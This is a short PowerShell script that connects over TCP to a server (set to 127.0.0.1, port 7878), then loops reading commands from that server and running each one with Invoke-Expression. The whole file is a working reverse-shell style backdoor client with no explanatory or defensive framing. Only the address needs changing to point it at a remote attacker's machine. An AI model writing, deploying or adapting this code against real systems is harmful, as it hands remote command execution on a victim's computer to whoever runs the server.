# Define server IP and port
$server = "127.0.0.1"
$port = 7878

# Create a TCP client and connect to the server
$tcpClient = New-Object System.Net.Sockets.TcpClient
$tcpClient.Connect($server, $port)

# Check if the connection was successful
if ($tcpClient.Connected) {
    Write-Host "Connected to the server at ${server}:${port}"

    # Get the network stream to read/write data
    $networkStream = $tcpClient.GetStream()
    
    # Function to execute received command
    function Execute-Command($command) {
        Write-Host "Executing command: $command"
        try {
            # Execute the command and capture the output
            $output = Invoke-Expression $command
            Write-Host "Output:`n$output"
        } catch {
            Write-Host "Failed to execute command: $_"
        }
    }

    # Loop to continuously receive and execute commands
    while ($true) {
        # Buffer to store the server's command
        $buffer = New-Object Byte[] 512
        $bytesRead = $networkStream.Read($buffer, 0, $buffer.Length)
        
        # Exit loop if the server disconnects
        if ($bytesRead -eq 0) {
            Write-Host "Server disconnected"
            break
        }

        # Convert received bytes to string
        $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead).Trim()
        Write-Host "Received command from server: $command"

        # Execute the received command
        Execute-Command $command
    }
    
    # Close the connection
    $networkStream.Close()
    $tcpClient.Close()
    Write-Host "Disconnected from server"
} else {
    Write-Host "Failed to connect to the server"
}
